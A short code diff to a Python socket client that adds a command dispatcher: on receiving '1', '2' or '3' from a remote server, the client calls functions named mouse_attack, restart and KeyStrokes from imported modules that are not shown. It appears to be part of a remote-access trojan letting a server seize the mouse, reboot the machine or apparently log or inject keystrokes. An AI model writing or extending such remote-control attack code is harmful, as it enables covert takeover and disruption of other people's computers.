@@ -1,4 +1,6 @@
 import socket
+import MouseControl , KeyStrokes , Restart
+
 
 def start_client():
     # Create a socket object
@@ -27,6 +29,17 @@ def start_client():
             print("Server closed the connection")
             break
         
+        if server_message == '1':
+            MouseControl.mouse_attack()
+        
+        if server_message == '2':
+            Restart.restart()
+        
+        if server_message == '3':
+            KeyStrokes.KeyStrokes()
+        
+        else:
+            pass
         print(f"Server: {server_message}")
 
     # Close the client socket
